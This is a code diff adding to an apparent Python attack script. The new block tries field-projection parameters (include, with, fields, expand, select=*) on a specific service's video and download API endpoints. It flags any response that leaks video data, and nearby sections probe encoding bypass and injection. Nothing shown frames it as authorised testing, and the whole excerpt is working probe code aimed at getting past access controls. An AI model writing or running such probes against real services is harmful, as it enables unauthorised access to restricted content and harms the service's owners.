@@ -168,6 +168,32 @@ for method, path, hdrs in misc_tests:
     log("misc %s: %s %s" % (path[:45], st, b[:110].replace("\n", " ")))
     time.sleep(0.4)
 
+# 2d. 字段投影攻击 (include/fields 尝试返回视频字段)
+log("=== 字段投影 ===")
+proj_urls = [
+    "/api/lois/6422?include=video",
+    "/api/lois/6422?include=video_url",
+    "/api/lois/6422?with=video",
+    "/api/lois/6422?fields=video,images",
+    "/api/lois/6422?expand=video",
+    "/api/lois/6422?embed=video",
+    "/api/lois?page=1&include=video",
+    "/api/lois?page=1&with=video_url",
+    "/api/user/loi/download_v6/6422?include=url",
+    "/api/user/loi/online_play_v2/6422?include=video",
+    "/api/lois/6422?include[]=video",
+    "/api/lois/6422?select=*",
+]
+for path in proj_urls:
+    st, b = req("GET", path, headers=H)
+    got_video = "video" in b.lower() and "60001" not in b
+    res.append({"t": "proj-" + path[:50], "s": st, "b": b[:300]})
+    log(
+        "proj %s: %s %s%s"
+        % (path[:55], st, b[:100].replace("\n", " "), " <<<VIDEO!" if got_video else "")
+    )
+    time.sleep(0.4)
+
 # 3. 二次注入/编码绕过
 log("=== 编码注入 ===")
 enc_tests = [
